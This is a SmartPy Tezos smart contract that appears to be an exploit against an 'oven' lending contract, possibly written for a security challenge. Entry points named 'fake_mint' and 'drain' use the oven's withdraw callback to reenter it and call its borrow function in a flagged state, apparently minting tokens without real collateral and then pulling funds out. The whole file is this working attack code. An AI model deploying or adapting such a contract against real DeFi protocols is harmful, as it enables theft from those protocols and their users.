import smartpy as sp

class Contract(sp.Contract):
  def __init__(self):
    self.init_type(sp.TRecord(minterAddress = sp.TAddress, myOvenAddress = sp.TAddress, ovenFactoryAddress = sp.TAddress, owner = sp.TAddress, state = sp.TIntOrNat, tokensToBorrow = sp.TNat).layout((("minterAddress", ("myOvenAddress", "ovenFactoryAddress")), ("owner", ("state", "tokensToBorrow")))))
    self.init(minterAddress = sp.address('KT1Tezooo5zzSmartPyzzSTATiCzzzz48Z4p'),
              myOvenAddress = sp.address('tz1bTpviNnyx2PXsNmGpCQTMQsGoYordkUoA'),
              ovenFactoryAddress = sp.address('KT1Tezooo7zzSmartPyzzSTATiCzzzvTbG1z'),
              owner = sp.address('KT1TezoooozzSmartPyzzSTATiCzzzwwBFA1'),
              state = 0,
              tokensToBorrow = 0)

  @sp.entry_point
  def default(self):
    sp.if self.data.state == 0:
      sp.send(self.data.owner, sp.balance)
    sp.else:
      sp.send(self.data.myOvenAddress, sp.balance)
      sp.transfer(self.data.tokensToBorrow, sp.tez(0), sp.contract(sp.TNat, self.data.myOvenAddress, entry_point='borrow').open_some())
      self.data.state = 0

  @sp.entry_point
  def drain(self, params):
    sp.set_type(params, sp.TMutez)
    sp.transfer(params, sp.tez(0), sp.contract(sp.TMutez, self.data.myOvenAddress, entry_point='withdraw').open_some())

  @sp.entry_point
  def fake_mint(self, params):
    sp.set_type(params, sp.TNat)
    self.data.tokensToBorrow = params
    self.data.state = 1
    sp.send(self.data.myOvenAddress, sp.tez(1))
    sp.transfer(sp.tez(1), sp.tez(0), sp.contract(sp.TMutez, self.data.myOvenAddress, entry_point='withdraw').open_some())

  @sp.entry_point
  def oven_create(self):
    sp.send(self.data.ovenFactoryAddress, sp.tez(0))

  @sp.entry_point
  def set_my_oven_address(self, params):
    sp.set_type(params, sp.TAddress)
    self.data.myOvenAddress = params

sp.add_compilation_target("test", Contract())